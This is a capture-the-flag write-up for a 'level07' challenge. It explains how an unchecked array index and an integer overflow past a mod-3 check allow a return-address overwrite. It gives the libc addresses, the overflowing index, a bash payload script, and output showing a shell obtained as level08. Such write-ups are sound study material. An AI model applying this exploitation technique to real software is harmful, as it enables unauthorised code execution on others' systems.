# Integer overflow (level07)

This [binary](source.c) is basically a command prompt. The user can store a
number, read a number or quit. The store function is the vulnerable one.  It
will write a 32bit unsigned int into a *data* array of 100 elements. The user
will provide the index at which to write the *number*. However the only check
the program does on the user provided index is that it is not divisible by three
(*index* mod 3 != 0). This means that if it passes this condition the user can
write anywhere within a 32bit integer reach. It can take indexes way beyond the
length of the array, or even in the negatives.

The simplest thing to do here would be a
[ret2libc](https://bufferoverflows.net/ret2libc-exploitation-example/) exploit.
This would require writing on the index 114 for the *main* function and -10 for
*store_number*. The problem is that both indexes return 0 on mod 3. Also since
the *store_number* must be called two times to pass a parameter to the function
replacing the return address, the first number stored will be overwritten.

```shell
# what happens when directly trying to store at index 114
Input command: store
 Number: whatever
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Now since the index 114 wont directly work we could do a got overwrite. The got
table is way before the stack in memory so the index needs to be negative but
this is actually possible. The problem here is also passing a parameter. It can
probably be done by overwriting parameters already given to function whose got
address is being overwritten, but this is a lot of work. The simplest solution
is to overflow our index.

An overflow is possible because when computing the address where the number is
going to be written the index is multiplied by four (it is really shifted on the
left by two places, but it's the same thing). This is because the array is
storing 32bit numbers, which are 4 bytes long. All we need to do is to find a
32bit signed integer that when multiplied by 4 will overflow to 114 * 4 (456).

We start from our index in binary. 114 is 0b00000000000000000000000001110010.
Since it will be shifted left by two all we need is to add a bit in one or both
of the two first bits: 0b10000000000000000000000001110010. This is 2147483762 as
an unsigned int (although it will be interpreted as -2147483534 for a singed int
but it does not really matter since the same bitshift is applied anyway).

We can check that it works with [this](overflow.c) little helper program:

```shell
./a.out 2147483762
-2147483534 * 4 = 456
```

And it passes the mod 3 test since it is not divisible by three. Now we build
our payload. All we need is the address of system and the address of "/bin/sh"
in decimal form:

- system: 0xf7e6aed0 -> 4159090384
- "/bin/sh": 0xf7f897ec -> 4160264172

The indexes are 2147483762 and 116 respectively.

[Here](exploit.bash) is the exploit:

```shell
cat << END
store
4159090384		# system's address
2147483762		# index overflowing to 456

store
4160264172		# "/bin/sh" address
116				# index of system's parameter

quit			# make the main function return
END

cat				# keep the pipe open
```

```shell
# execute the exploit
./exploit.bash | ./level07
whoami
level08
```
